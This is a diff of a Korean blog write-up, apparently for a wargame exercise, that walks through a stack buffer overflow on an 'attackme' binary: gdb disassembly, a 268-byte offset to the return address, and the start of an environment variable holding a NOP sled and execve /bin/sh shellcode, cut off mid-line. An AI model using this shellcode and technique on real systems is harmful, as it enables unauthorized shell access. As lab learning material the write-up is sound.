@@ -33,20 +33,19 @@ int main(void)
 
 **attackme 코드를 디버깅해야하기 때문에 tmp폴더로 복사하자.**<br>
 ```cp attackme tmp```<br><br>
-
 **그리고 디버깅을 해보자**<br>
 ```gdb -q attackme```<br>
 ```disas main```<br>
 
 <main+3>을 보면 esp에서 0x108만큼 빼고 있다. 여기서 0x108은 10진수로 264이다.<br>
 필요한 공간은 str배열의 크기인 256일텐데 왜 264나 자리를 마련했을까?<br>
-바로 dummy다! 8byte의 dummy가 존재하는 것이다. ~~(왜 존재할까)~~<br><br>
+바로 dummy다! 8byte의 dummy가 존재하는 것이다. ~~(왜 존재할까)~~<br>
 
 ret전에 sfp 4바이트가 존재할테니 결론적으로 말하면<br>
-**str에서 ret까지의 거리는 총 268byte이다!**<br><br>
+**str에서 ret까지의 거리는 총 268byte이다!**<br>
 
 자, 2번으로 넘어가자.<br>
-**다음과 같이 환경변수를 작성해보자.**쉘 코드는 구글에서 돌아다니는 25byte짜리를 가져왔다. <br>
+**다음과 같이 환경변수를 작성해보자.** 쉘 코드는 구글에서 돌아다니는 25byte짜리를 가져왔다. <br>
 *(다음에 쉘 코드에 대해 더 공부해봐야겠다....)*<br>
 ```
 export shellcode=$(python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
